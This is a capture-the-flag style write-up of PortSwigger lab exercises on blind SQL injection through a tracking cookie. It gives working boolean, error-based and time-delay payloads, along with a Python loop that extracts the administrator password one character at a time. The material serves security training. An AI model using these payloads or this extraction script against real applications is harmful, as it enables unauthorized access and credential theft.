When the HTTP responses do not contain the results of the relevant SQL query or the detail of any database errors doesn't mean that there isn't an SQL injection Vulnerability. Blind SQL injection is the process of access unauthorized data using different techniques than the ones seen before (many techniques such as UNION attacks are not effective while performing blind SQL injection)

## Exploiting blind SQL injection by triggering conditional responses

To solve this lab we need to log in as administrator user. We are given the information that the database contains a table called `users`, with columns called `username` and `password`.

In blind SQL injection, we can trigger conditional responses by injecting cookies. This lab contains an application that uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. Since its a blind SQL injection, the results of the SQL query are not returned, and no error messages displayed, but the application includes a "Welcome back" message in the page if the query returns any rows.

To solve this challenge we use Burp Suite.

The firs step is send the application's request to Burp Intruder and modify the `TrackingId` cookie in order to verify that the "Welcome back" message appears in the response. To do this we need to change the cookie to `TrackingId=x'+OR+1=1--`:

Then, we change it to `TrackingId=x'+OR+1=2--` which will return as `false` and let us verify that the "Welcome back" message does not appear in the response, to demonstrate that we can test a single boolean condition and infer the result.

Now, we need to confirm that there is a user called administrator, but first we need to find the number of columns in the database. We can easily verify the number of columns using the `null` method from the other labs. To confirm that the user administrator exists we change the cookie to `TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'--`:

Next we need to determine how many characters are in the password of the administrator user. To do this we change the cookie to `TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>1--` and send it to burp intruder. Burp intruder will cycle through each position and possible value, testing each one in turn. We clear the default positions and add `1` making it look like ยง1ยง. Next, on the payloads tab we select a "Simple list" and add the range 1-9 to the "Payload Options". To be able to tell when we reach the current value of the password lenght, we need to grep each response for the expression "Welcome back". To do that we go to the Options tab and add the value "Welcome back" to the "Grep - Match" section. We can now lauch the attack clicking on "Start attack":

We can notice by the of the response that it changes once our payload injected the number 6, meaning that the lenght of the password is bigger than 5 but not bigger than 6, therefore it has 6 characters. So now we know the lenght of the password, we need to find the actual characters it contains. To do this we change the cookie to `TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--`, change the payload type to "Cluster bomb" and select the first "1" and "a" in `substring(1,1)='a'` as the payload markers. Then for the first payload we add a range of 1-6 and for the second from a-z. The rest of the process is like the previous method. We hit "Start attack" and wait for a response to tell us the password characters:

```
password: tyhmpe
```

Now we just need to log in and solve the lab:

Although Burp Suite is a great tool, the process of finding a password using it took a long time in my opinion. And since I am a lazy guy I decided to write a simple script to solve this lab and perhaps reuse it on later labs:

## Inducing conditional responses by triggering SQL errors

![7](https://user-images.githubusercontent.com/57036558/77114105-dd742f00-6a23-11ea-9b81-d531c8d31abb.png)

This lab uses again tracking cookies for analytics, and performs an SQL query containing the value of the submitted cookie. We are given the infromation that the database contains a different table called users, with columns called username and password, and that to solve the lab we need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

Supposing that the SQL query does not behave any differently depending on whether the query returns any data, the techniques used before will not work since injecting different Boolean conditions makes no difference to the application's response. In this situation, we need to try to return conditional responses by triggering SQL errors conditionally. By modifying a query to `true`, it will cause a database error, and by modifiying it to `false` will not return any result whatsoever. 

So, to solve this lab, we first need to verify if an error message is received using (`'` or `''` may trigger the error). Then, we need to find which type of database the application is using. To do that we can check the 
[SQL injection cheat sheet](https://github.com/ricard0lopes/Portswigger-Academy/blob/master/Sql-Injection/SQL-injection-cheat-sheet.md) and try the different methods for testing conditional erros or each database. We will know which database is being used when our `false` conditional injection doesn't throw any error and returns the website page. The next step is is to verify the conditonal error using the right database's query injection and to notice how it throws the error only if the condition is `true`.

Now it is time to find if there is a user called administrator. Since this lab is running Oracle as its database we can use the following query (but the process is pretty much the same for other databases, you just need to modify the conditional part of the query):

```
TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--
```

Since the conditional returns an error from the application, it means that there is a user called administrator.
Now the process is basically the same as the lab before: finding the length of administrator's password, then find the characters of the password one by one. 

To solve this lab I decided to create my own script using Burp Suite to debug my requests. You can check the script [Python automated lab](https://github.com/ricard0lopes/Portswigger-Academy/blob/master/Sql-Injection/tools/blind2.py) and use or change it as you wish. 

## Exploiting blind SQL injection by triggering time delays

![8](https://user-images.githubusercontent.com/57036558/77119308-1addba00-6a2e-11ea-9064-a792dd8f982f.png)

To solve this lab, we need to exploit the SQL injection vulnerability to cause a 10 second delays.

Supposing that the application now catches and handles database errors, triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response.
In this situation we can try to exploit the SQL injection vulnerability by triggering time delays conditionally, depending on an injection conditional. 
"Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received". To find the right SQL injection query to create a time delay for each database we can check the SQL injection cheat sheet.

This lab has a PostgreSQL database, so we can cause a 10 seconds delay using the query `x' ||pg_sleep(10)` where the `||` represent the conditional `OR` to return the query to true and cause the delay.

![9](https://user-images.githubusercontent.com/57036558/77156321-11d50300-6a97-11ea-80ef-311da09144e2.png)

In this lab we need to use a conditinal time delay to get the administrator's password and login.

We start Burp Suite and send the request to Burp Repeater. First we need to check the time delay on the response when the conditional is true. So we can do this by first injecting a `false` conditional query on the cookie `TarckingId`:

```
x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

then, we inject the `true` conditional query to notice that the response takes 10 seconds to return:

```
x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Having the confirmation that we can exploit the application triggering an SQL injection time delay, and with the given information that we have a tabel called `users` with columns named `username` and `password`, we will inject another time delay conditional to check if there is a user called administrator.

```
x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Having confirmed, with the 10 seconds delay on the response, that there is a user called administrator registered on this application, we now need to find the length of its password using the same methods has before with the query:

```
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
And incrementing the number on the password length condition `length(password)>1` to `2`, `3`, etc, until the response returns without delay. In this lab, again, the password only has 6 characters.

To find the password character we could send the request to the Burp Suite Intruder and set a payload with all the characters and numbers. There, while executing the attack, we would need to go to the "Columns" menu and check the box "Response received", that would add a new column in the results represesenting the number of milliseconds the application took to response, and look for the rows with a reponse in the reign of 10,000 milliseconds to know our character.

But to make things simplier and faster I just used Python:

>>> for num in length:
...     for c in char:
...             p1 = payload.replace("ยง1ยง", str(num))
...             p2 = p1.replace("ยงaยง", c)
...             cookies = session.cookies.set('TrackingId', None)
...             cookies = session.cookies.set('TrackingId', p2)
...             response = session.get(url)
...             time = response.elapsed.total_seconds()
...             if time >= 10:
...                     print(c)
...                     break

The password for the user administrator in this lab is: `73fj7r`
